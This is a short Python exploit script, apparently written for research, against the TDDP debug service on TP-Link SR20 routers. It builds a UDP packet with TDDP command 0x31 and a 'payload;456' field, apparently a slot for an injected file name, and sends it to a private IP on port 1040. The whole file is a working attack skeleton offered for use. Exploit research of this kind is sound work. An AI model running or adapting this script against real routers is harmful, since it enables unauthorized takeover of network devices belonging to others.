# Author: raycp
# File: exp.py
# Date: 2019-06-30
# Description: exp for tddp vuln in tp-link sr20.

from pwn import *

p=remote("172.16.217.149",1040,typ="udp")

tddp_typ=01
tddp_command=0x31
payload=p8(tddp_typ)+p8(tddp_command)
payload=payload.ljust(12,'\x00')
payload+="payload;456"

p.sendline(payload)
